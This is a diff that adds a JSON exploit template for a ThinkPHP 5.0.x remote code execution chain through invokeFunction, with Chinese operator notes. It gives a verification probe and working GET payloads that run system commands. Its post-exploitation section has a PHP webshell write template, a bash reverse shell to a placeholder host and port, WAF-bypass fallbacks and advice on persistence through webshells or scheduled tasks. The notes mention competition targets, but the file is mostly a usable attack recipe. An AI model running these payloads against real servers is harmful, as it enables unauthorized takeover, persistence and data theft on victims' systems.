@@ -1,0 +1,124 @@
+{
+  "id": "thinkphp-5.0.x-debug-route-rce",
+  "family": "thinkphp",
+  "product": "ThinkPHP",
+  "cve": "N/A",
+  "aliases": [
+    "ThinkPHP 5.0.x debug invokeFunction chain"
+  ],
+  "severity": "high",
+  "tags": [
+    "thinkphp",
+    "debug",
+    "invokeFunction",
+    "rce",
+    "n-day"
+  ],
+  "applicability": {
+    "versions": [
+      "5.0.x"
+    ],
+    "fingerprints": [
+      "Verbose debug or exception pages expose ThinkPHP internals",
+      "Stack traces reference \\think\\Container or \\think\\app classes",
+      "index.php?s= route-style dispatch is still available"
+    ],
+    "signals": [
+      "目标对异常输入返回包含类名、文件路径或函数栈的调试信息",
+      "调试模式下更容易确认真实版本、路径与命名空间",
+      "未认证用户可见的错误页会泄露可用的调用链"
+    ]
+  },
+  "preconditions": [
+    "未认证访问可触发异常或调试信息。",
+    "请求会被路由到 ThinkPHP 5.0.x 前控制器。",
+    "防护组件没有屏蔽关键命名空间字符串。"
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=thinkphp_debug_probe",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "*/*"
+        },
+        "data": "",
+        "matchers": [
+          "ae1c22cf893c46eba47b21fb4867ef1e",
+          "异常页或正文中出现 md5 marker"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先收集调试页暴露的绝对路径、环境变量和配置文件路径。",
+      "利用已有错误页信息判断 web 根目录、缓存目录、日志目录和 session 目录。",
+      "如果写文件可行，优先写最小化 webshell 或计划任务，而不是持续触发高噪声调试链。"
+    ],
+    "shell_options": [
+      {
+        "type": "php_webshell_write",
+        "template": "printf '%s' '<?php echo shell_exec($_GET[\"cmd\"] ?? \"id\"); ?>' > {writable_path}/debug_tp.php"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "sh -c 'sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先利用调试页补全框架路径、版本和入口点。",
+      "验证链路时优先用 md5 标记或 printf 常量输出。",
+      "确认代码执行后优先转向更稳定的文件写入和配置泄露路径。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "ls -la"
+    ],
+    "shell_prerequisites": [
+      "确认命令结果不会被调试模板裁剪。",
+      "确认响应中没有额外转义影响命令回显判断。"
+    ],
+    "fallbacks": [
+      "如果 Container 命名空间被拦截，退回 think\\app/invokefunction 或 Request/input 链。",
+      "如果执行结果不直出，利用调试页泄露的路径找日志写入或可读配置。"
+    ]
+  },
+  "detection_notes": [
+    "调试模式类题目通常不是单点 payload 复现，路径和配置泄露价值同样高。",
+    "如果目标是比赛环境，优先保留已验证的链路和目录信息，减少重复触发。"
+  ],
+  "references": [
+    "Public ThinkPHP 5.0.x debug and invokeFunction write-ups",
+    "Vulhub ThinkPHP 5.x reproduction notes"
+  ]
+}
